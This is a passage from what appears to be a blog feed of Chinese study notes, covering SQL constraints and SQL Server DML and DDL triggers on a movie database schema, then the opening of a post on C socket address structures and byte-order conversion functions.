class="type">INT</span>,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> <span class="keyword">PRIMARY KEY</span>(title, <span class="keyword">year</span>),</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span>(studioName) <span class="keyword">REFERENCES</span> Studios(name) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">SET</span> <span class="keyword">NULL</span>, <span class="comment">-- 对面被删除时此处置空</span></span><br><span class="line">    <span class="keyword">FOREIGN KEY</span>(producerC) <span class="keyword">REFERENCES</span> MovieExecs(cert) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="comment">-- 级联更新</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>  注意，后面几行的约束开头的<code>CONSRAINT</code>关键字可以省略，但是如果要给约束命名，就需要带上<code>CONSRAINT</code>关键字并紧接着约束名。其实命名在前在后都行，不过在前的话一定要带上<code>CONSRAINT</code>关键字。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">CHAR</span>(<span class="number">100</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName <span class="type">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    producerC <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> titleyear_key(title, <span class="keyword">year</span>),</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> pro_fkey <span class="keyword">FOREIGN KEY</span>(studioName) <span class="keyword">REFERENCES</span> Studios(name) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">SET</span> <span class="keyword">NULL</span></span><br><span class="line">    <span class="keyword">FOREIGN KEY</span>(producerC) <span class="keyword">REFERENCES</span> MovieExecs(cert) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="comment">-- 级联更新</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="修改约束"><a href="#修改约束" class="headerlink" title="修改约束"></a>修改约束</h4><p>  <img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/00.png" alt="11"></p></li></ul><h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><h4 id="触发器与约束的区别"><a href="#触发器与约束的区别" class="headerlink" title="触发器与约束的区别"></a>触发器与约束的区别</h4><ul><li>仅当数据库程序员声明的事件发生时，触发器才被<strong>激活</strong>。<br>  如对特定关系的插入、删除、修改或事务的结束等。</li><li>当触发器被事件激活时，触发器<strong>测试</strong>触发的条件。如果条件不成立，则响应该事件的触发器不做任何处理。</li><li>如果触发器声明的条件满足，则与该触发器相连的动作由<strong>DBMS</strong>执行。动作可以是任何数据库操作序列，包括与触发事件毫无关联的操作。</li><li><code>INSTEAD OF</code>触发器在约束前起作用，<code>AFTER</code> 触发器在约束后起作用。</li></ul><h4 id="触发器分类"><a href="#触发器分类" class="headerlink" title="触发器分类"></a>触发器分类</h4><p>按触发事件的不同</p><ul><li><code>DML</code>触发器<br>  当数据库中发生DML事件时将自动调用DML触发器。</li><li><code>DDL</code>触发器<br>  当发生DDL事件时将触发DDL触发器</li></ul><blockquote><h4 id="一、-DDL-语句"><a href="#一、-DDL-语句" class="headerlink" title="一、 DDL 语句"></a>一、 DDL 语句</h4><p>DDL（Data Definition Language）语句： <code>数据定义语言</code>，主要是进行定义&#x2F;改变表的结构、数据类型、表之间的链接等操作。常用的语句关键字有 CREATE、DROP、ALTER 等。</p><p>模板如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> 表名(</span><br><span class="line">列名<span class="number">1</span> 数据类型,</span><br><span class="line">列名<span class="number">2</span> 数据类型,</span><br><span class="line">列名<span class="number">3</span> 数据类型,</span><br><span class="line">...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> 表名;</span><br><span class="line">eg：<span class="keyword">ALTER TABLE</span> 表名 <span class="keyword">ADD</span> 列名 数据类型;（添加一个列）</span><br><span class="line">    <span class="keyword">ALTER TABLE</span> 表名 CHANGE 列名 新列名 新数据类型;（修改列名）</span><br><span class="line">    <span class="keyword">ALTER TABLE</span> 表名 <span class="keyword">DROP</span> 列名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 表名;</span><br><span class="line"><span class="keyword">DROP</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure><h4 id="二、-DML-语句"><a href="#二、-DML-语句" class="headerlink" title="二、 DML 语句"></a>二、 DML 语句</h4><p>DML（Data Manipulation Language）语句: <code>数据操纵语言</code>，主要是对数据进行增加、删除、修改操作。常用的语句关键字有 INSERT、UPDATE、DELETE 等。</p><p>模板如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> 表名 (字段<span class="number">1</span>,字段<span class="number">2</span>,...) <span class="keyword">values</span> (某值,某值,...),(某值,某值,...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 列名<span class="operator">=</span>新值 <span class="keyword">WHERE</span> 限定条件;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 限定条件;</span><br></pre></td></tr></table></figure><p><strong>DDL 语句与DML 语句的主要区别：</strong></p><table><thead><tr><th></th><th>DDL</th><th>DML</th></tr></thead><tbody><tr><td>名称</td><td>数据定义语言</td><td>数据操纵语言</td></tr><tr><td>区别</td><td>对<strong>数据库内部</strong>的对象进行创建、删除、修改操作</td><td>只是对<strong>表内部</strong>数据进行操作 (不涉及到表的定义、结构的修改，也不涉及到其他对象)</td></tr></tbody></table></blockquote><p>按被激活的时机不同</p><ul><li><code>AFTER</code>触发器<br>  在DML操作或DDL操作之后被激活的，对表进行<strong>约束检查</strong>等动作都在 <code>AFTER</code> 触发器<strong>被激活之前</strong>发生。<strong>操作事件 -&gt; 约束检查 -&gt; 触发器激活</strong></li><li><code>INSTEAD OF</code>触发器<br>  INSTEAD OF 触发器并不执行其定义的操作 (insert 、 update 、 delete)而仅是执行触发器本身，INSTEAD OF 触发器可用于表和视图。</li></ul><p>执行顺序：</p><ul><li><p><strong>数据变更操作</strong> 先执行。</p></li><li><p><strong><code>BEFORE</code> 触发器</strong> 在数据变更操作之后、约束检查之前执行。</p></li><li><p><strong>约束检查</strong> 在 <code>BEFORE</code> 触发器之后执行，如果违反约束，操作回滚。</p></li><li><p><strong>数据变更提交</strong> 在约束检查通过后进行。</p></li><li><p><strong><code>AFTER</code> 触发器</strong> 在数据变更提交之后执行。</p></li></ul><h4 id="DML触发器"><a href="#DML触发器" class="headerlink" title="DML触发器"></a>DML触发器</h4><p>例：在 MovExecs 关系上创建触发器，该触发器的作用是阻挠降低电影制作人净资产值的企图。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> netWorthTrigger</span><br><span class="line"><span class="keyword">ON</span> moviesExecs AFTER <span class="keyword">UPDATE</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">IF <span class="keyword">UPDATE</span>(networth)</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/01.png" alt="11"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 例：在 MvieExecs 关系上创建触发器，该触发器的作用是阻挠往 MvieExecs 中插入净资产值低于 1000 万元组的操作。</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> movieExecs_insertTrigger</span><br><span class="line"><span class="keyword">ON</span> movieExecs AFTER <span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">IF (<span class="keyword">SELECT</span> netWorth <span class="keyword">FROM</span> INSERTED) <span class="operator">&lt;</span> <span class="number">10000000</span></span><br><span class="line"><span class="keyword">ROLLBACK</span></span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/02.png" alt="02"></p><p>因为只插入了一条数据，所以按理来说<code>INSTERED</code>表只有一条被插入到触发器表的数据。<code>INSTERED</code>表并不会复制触发器表原先的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 例：在 MovieExecs 关系上创建 DELETE 触发器，当删除了某位制片人时，将 Movies 关系中对应的制片人证件号设置空值。</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> movieExecs_deleteTrigger</span><br><span class="line"><span class="keyword">ON</span> movieExecs AFTER <span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">UPDATE</span> Movie <span class="keyword">SET</span> producerC <span class="operator">=</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> producerC <span class="keyword">IN</span> (</span><br><span class="line"><span class="keyword">SELECT</span> cert</span><br><span class="line">    <span class="keyword">FROM</span> DELETED</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/03.png" alt="03"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 例：在 MovieExecs 关系上创建触发器，该触发器的作用是阻挠降低电影制作人净资产值的企图。</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> netWorthTrigger</span><br><span class="line"><span class="keyword">ON</span> movieExecs AFTER <span class="keyword">UPDATE</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">IF <span class="keyword">UPDATE</span>(networth)</span><br><span class="line">IF (<span class="keyword">SELECT</span> netWorth <span class="keyword">FROM</span> INSTERED) <span class="operator">&lt;</span> (<span class="keyword">SELECT</span> netWorth <span class="keyword">FROM</span> DELETED)</span><br><span class="line"><span class="keyword">ROLLBACK</span></span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/04.png" alt="04"></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/05.png" alt="05"></p><h3 id="DDL触发器"><a href="#DDL触发器" class="headerlink" title="DDL触发器"></a>DDL触发器</h3><p>DDL 触发器是可以是<strong>基于数据库</strong>层面的触发器，如果某些操作是对<strong>数据库进行操作</strong>比如说<strong>增加表</strong>或者<strong>删除表</strong>时操作就会触发</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 用DDL触发器来防止对当前数据做删除表和修改表的操作</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> safety</span><br><span class="line"><span class="keyword">ON</span> DATABASE <span class="comment">-- DATABASE 表示当前数据库</span></span><br><span class="line">AFTER DROP_TABLE, ALTER_TABLE</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">PRINT <span class="string">&#x27;You must disable Trigger &quot;safety&quot; to drop or alter tables!&#x27;</span></span><br><span class="line"><span class="keyword">ROLLBACK</span> TRANSACTION</span><br></pre></td></tr></table></figure><p>可用 <code>DDL_TABLE_EVENTS</code> 表示 <code>CREATE TABLE</code>、<code>ALTER TABLE</code>、<code>DROP TABLE</code>事件</p><p>DDL 触发器也可以是<strong>基于服务器</strong>层面的触发器，可以就一些<strong>登录事件</strong>触发</p><p>服务器上的 DDL 触发器可以用 <code>DDL_LOGIN_EVENTS</code> 表示 <code>CREATE LOGIN</code> 、<code> ALTERLOGIN</code> 、 <code>DROP LOGIN</code> 事件。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 用 DDL 触发器来防止创建和修改服务器账号事件。</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> loginTrigger</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">ALL</span> SERVER</span><br><span class="line">BEFORE DDL_LOGIN_EVENTS</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">PRINT <span class="string">&#x27;No login creations without DBA involvement&#x27;</span></span><br><span class="line"><span class="keyword">ROLLBACK</span></span><br></pre></td></tr></table></figure><p>程序员执行：<code>CREATE LOGIN user WITH PASSWORD = &#39;123456&#39;</code>会触发触发器</p><h4 id="禁用和启用DDL触发器"><a href="#禁用和启用DDL触发器" class="headerlink" title="禁用和启用DDL触发器"></a>禁用和启用DDL触发器</h4><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch7/06.png" alt="06"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> Movies(studioName, title, <span class="keyword">year</span>)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;中国电影股份有限公司&#x27;</span>, <span class="string">&#x27;流浪地球&#x27;</span>, <span class="number">2019</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">year</span> <span class="operator">&lt;</span> <span class="number">1980</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> MovieExecs</span><br><span class="line"><span class="keyword">SET</span> address <span class="operator">=</span> <span class="string">&#x27;B&#x27;</span>, netWorth <span class="operator">=</span> netWorth <span class="operator">*</span> <span class="number">0.9</span></span><br><span class="line"><span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;Ford&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> moviesView</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> title, <span class="keyword">year</span></span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;中国电影&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> viewTrigger</span><br><span class="line"><span class="keyword">ON</span> moviesView INSTEAD <span class="keyword">OF</span> <span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">INSERT INTO</span> Movies(studioName, title, <span class="keyword">year</span>)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;中国电影股份有限公司&#x27;</span>, title, <span class="keyword">year</span></span><br><span class="line"><span class="keyword">FROM</span> INSERTED</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket编程</title>
      <link href="/2024/12/01/Socket%E7%BC%96%E7%A8%8B/"/>
      <url>/2024/12/01/Socket%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/../posts_img/Socket%E7%BC%96%E7%A8%8B/Socket%E6%B5%81%E7%A8%8B.gif" alt="00"></p><p>在<code>socket</code>编程中有一个通用的结构体来表示通用的表示一个网络中某个主机的地址<code>struct sockaddr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 16字节 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> /* <span class="title">socket_address</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">sa_family_t</span> sa_family; <span class="comment">/* 地址族协议(2字节) */</span></span><br><span class="line"><span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 端口(2字节) + IP地址(4字节) + 填充(8字节) */</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个结构体可以表示所有类型的网络，包括<code>ipv4</code>。因为比较普遍，所以<code>socket</code>中的大部分<code>API</code>中有关主机地址的参数类型都是它。就像父类一样，用多态的方式使用。</p><p>此外，使用地址类型的参数时还会有个<code>socklen_t addrlen</code>参数和它配套使用，表示地址变量的大小(bytes)</p><p>因为现在大多用的是<code>ipv4</code>协议，所以专门有一个类型表示<code>ipv4</code>地址，它的内存大小与<code>struct sockaddr</code>完全一样，内存布局也相似，完全就是它的子类一样</p><p><a href="https://subingwen.cn/linux/socket/">套接字-Socket | 爱编程的大丙 (subingwen.cn)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">uint16_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">sa_family_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> <span class="type">in_port_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> s_addr;  <span class="comment">/* 32-bit IPv4 address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">socklen_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> /* <span class="title">socket_address_internet</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">sa_family_t</span> sin_family;<span class="comment">/* 地址族协议(2字节): AF_INET */</span></span><br><span class="line">    <span class="type">in_port_t</span> sin_port;         <span class="comment">/* 端口, 2字节-&gt; 大端  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">/* IP地址, 4字节 -&gt; 大端  */</span></span><br><span class="line">    <span class="comment">/* 填充 8字节 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用到的时候需要传入指针，并且还需要像多态一样将其强制类型转化为其父类的指针，此外还需要配套一个<code>socklen_t addrlen</code>表示其大小。就像下面这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span> <span class="comment">/* client address */</span></span><br><span class="line"><span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">accept(welcomeSocket, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br></pre></td></tr></table></figure><p>网络字节序要求是大端发送的，所以跟<code>socket</code>相关的结构体尤其是<code>struct sockaddr_in</code>里面的<code>port</code>和<code>ip</code>地址要求都是大端存储的。为了实现对整数大小端的自由转换提供了<strong>2</strong>组<strong>4</strong>个函数，分别处理<code>2</code>个字节和<code>4</code>个字节大小的数据的大小端转换。</p><p>使用套接字通信函数需要包含头文件<code>&lt;arpa/inet.h&gt;</code>，包含了这个头文件<code>&lt;sys/socket.h&gt;</code>就不用在包含了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这套api主要用于 网络通信过程中 IP 和 port 的大小端的转换</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个短整形从主机字节序 -&gt; 网络字节序</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">htons</span><span class="params">(<span class="type">uint16_t</span> hostshort)</span>; <span class="comment">// host to net : short</span></span><br><span class="line"><span class="comment">// 将一个短整形从网络字节序 -&gt; 主机字节序</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">ntohs</span><span class="params">(<span class="type">uint16_t</span> netshort)</span>; <span class="comment">// net to host : short</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个整形从主机字节序 -&gt; 网络字节序</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">htonl</span><span class="params">(<span class="type">uint32_t</span> hostlong)</span>; <span class="comment">// host to net : long</span></span><br><span class="line"><span class="comment">// 将一个整形从网络字节序 -&gt; 主机字节序</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">ntohl</span><span class="params">(<span class="type">uint32_t</span> netlong)</span>; <span class="comment">// net to host : long</span></span><br></pre></td></tr></table></figure><p><code>IP</code>地址一般都是点分十进制字符串形式出现的，但其本质上还是<code>32</code>位<code>4</code>字节大小的整数(<strong>对IPv4而言</strong>)，所以还提供了针对<code>IP</code>地址(包括<code>IPv4和IPv6</code>)字符串和整数的转换函数。<strong>值得注意的是，转换的整数(不管的作为参数还是返回结果)都应该是大端序存储的。</strong></p><p><strong><code>n</code></strong>: <strong>Network</strong>（网络格式，也就是二进制格式(<strong>大端序整数格式</strong>)，通常是大端序的表示方式）</p><p><strong><code>p</code></strong>: <strong>Presentation</strong>（<strong>文本格式</strong>，适合人类阅读的形式，如 <code>&quot;192.168.1.1&quot;</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">// 将大端的整数, 转换为小端的点分十进制的IP地址字符串        </span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="title function_">inet_ntop</span><span class="params">(<span class="type">int</span> af, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">char</span> *dst, <span class="type">socklen_t</span> size)</span>;</span><br><span class="line">参数:</span><br><span class="line">af: 地址族协议</span><br><span class="line">AF_INET: ipv4格式的ip地址</span><br><span class="line">AF_INET6: ipv6格式的ip地址</span><br><span class="line">src: 传入参数, 这个指针指向的内存中存储了大端的整形IP地址</span><br><span class="line">dst: 传出参数, 存储转换得到的小端的点分十进制的IP地址</span><br><span class="line">size: 修饰dst参数的, 标记dst指向的内存中最多可以存储多少个字节</span><br><span class="line">返回值:</span><br><span class="line">成功: 指针指向第三个参数对应的内存地址, 通过返回值也可以直接取出转换得到的IP字符串</span><br><span class="line">失败: <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">// 将小端的点分十进制的IP地址字符串, 转换为大端的整数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">inet_pton</span><span class="params">(<span class="type">int</span> af, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">void</span> *dst)</span>; </span><br><span class="line">参数:</span><br><span class="line">af: 地址族(IP地址的家族包括ipv4和ipv6)协议</span><br><span class="line">AF_INET: ipv4格式的ip地址</span><br><span class="line">AF_INET6: ipv6格式的ip地址</span><br><span class="line">src: 传入参数, 对应要转换的点分十进制的ip地址: <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">dst: 传出参数, 函数调用完成, 转换得到的大端整形IP被写入到这块内存中</span><br><span class="line">返回值：成功返回<span class="number">1</span>，失败返回<span class="number">0</span>或者<span class="number">-1</span></span><br></pre></td></tr></table></figure><hr><p><img src="/../posts_img/Socket%E7%BC%96%E7%A8%8B/TCP-Socket%E7%BC%96%E7%A8%8B.png" alt="01"></p><p>客户端通过命令行向服务器发送数据，按下回车后会将换行符一起发送给服务器。可能是<code>\r\n</code>也可能是<code>\n</code>视操作系统不同吧</p><p>客户端代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span 